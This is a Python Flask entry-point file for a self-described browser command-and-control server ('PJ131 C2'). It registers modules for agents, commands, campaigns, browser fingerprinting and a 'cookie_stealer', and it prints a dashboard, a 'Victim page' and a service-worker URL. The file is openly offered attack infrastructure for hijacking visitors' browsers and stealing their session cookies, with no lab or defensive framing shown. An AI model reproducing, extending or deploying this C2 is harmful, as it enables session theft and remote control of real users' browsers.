"""
PJ131 C2 - Browser-based Command & Control Server
"""
from flask import Flask
from flask_cors import CORS
from models import db
from routes import (
    main_bp,
    agents_bp,
    commands_bp,
    campaigns_bp,
    stats_bp
)

import os

from utils.vapid import init_vapid_keys
from utils.vapid import init_vapid_keys
init_vapid_keys()

from features.fingerprint import fingerprint_bp
from features.cookie_stealer import cookie_stealer_bp

def create_app():
    """Application factory"""
    app = Flask(__name__)
    
    # Get absolute path to project directory
    basedir = os.path.abspath(os.path.dirname(__file__))
    
    # Create instance folder if it doesn't exist
    instance_path = os.path.join(basedir, 'instance')
    if not os.path.exists(instance_path):
        os.makedirs(instance_path)
        print(f"[+] Created instance folder: {instance_path}")
    
    # Database path
    db_path = os.path.join(instance_path, 'browserc2.db')
    
    # Configuration
    app.config['SECRET_KEY'] = os.urandom(24)
    app.config['SQLALCHEMY_DATABASE_URI'] = f'sqlite:///{db_path}'
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
    
    print(f"[+] Database path: {db_path}")
    
    # Enable CORS for all routes
    CORS(app)
    
    # Initialize database
    db.init_app(app)
    
    # Create tables
    with app.app_context():
        db.create_all()
        print("[+] Database tables created")
    
    # Register blueprints
    app.register_blueprint(main_bp)
    app.register_blueprint(agents_bp, url_prefix='/api')
    app.register_blueprint(commands_bp, url_prefix='/api')
    app.register_blueprint(campaigns_bp, url_prefix='/api')
    app.register_blueprint(stats_bp, url_prefix='/api')
    app.register_blueprint(fingerprint_bp, url_prefix='/api')
    app.register_blueprint(cookie_stealer_bp, url_prefix='/api')
    
    return app


if __name__ == '__main__':
    app = create_app()
    
    print("\n" + "="*60)
    print("🔥 PJ131 C2 - Browser Command & Control Server")
    print("="*60)
    print(f"📊 Dashboard: http://localhost:5000/c2")
    print(f"🎯 Victim page: http://localhost:5000/")
    print(f"🔧 Service Worker: http://localhost:5000/sw.js")
    print("="*60 + "\n")
   
    app.run(host='0.0.0.0', port=5000, debug=True, ssl_context=('cert.pem', 'key.pem'))

